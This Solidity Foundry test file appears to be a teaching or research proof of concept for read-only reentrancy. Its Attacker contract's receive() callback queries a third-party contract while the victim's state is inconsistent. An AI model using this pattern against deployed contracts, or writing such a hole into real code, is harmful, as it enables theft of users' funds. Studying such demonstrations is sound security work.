//SPDX-License_Identifier: GPL-3.0

import {ReadOnly, ThirdParty} from "../../src/Reentrancy/ReadOnly.sol";
import {Test, console} from "lib/forge-std/src/Test.sol";

pragma solidity 0.8.18;

contract ReadOnlyTest is Test {
    ReadOnly victim;
    Attacker attacker;
    ThirdParty thirdParty;
    address victim1 = makeAddr("victim1");

    function setUp() public {
        victim = new ReadOnly();
        thirdParty = new ThirdParty(address(victim));
        attacker = new Attacker(address(victim), address(thirdParty));
        vm.deal(victim1, 1 ether);
        vm.deal(address(attacker), 0.1 ether);
    }

    function test_readOnly() public {
        vm.prank(victim1);
        ReadOnly(victim).deposit{value: 0.3 ether}();
        vm.prank(address(attacker));
        attacker.attack();
        console.log(address(attacker).balance);
        assert(address(attacker).balance == 0.1 ether);
    }
}

contract Attacker {
    address victim;
    address thirdParty;
    uint256 constant amount = 0.1 ether;

    event StateManipulation(bool indexed isAttackerStillAllowedToWithdraw);

    constructor(address _victim, address _thirdParty) {
        victim = _victim;
        thirdParty = _thirdParty;
    }

    function attack() external {
        ReadOnly(victim).deposit{value: amount}();
        ReadOnly(victim).withdraw(amount);
    }

    receive() external payable {
        bool thisIsWrong = ThirdParty(thirdParty).isAllowedToWithdrawThirdParty(address(this), amount);
        emit StateManipulation(thisIsWrong); //TRUE: we can do something with this wrong state
    }
}
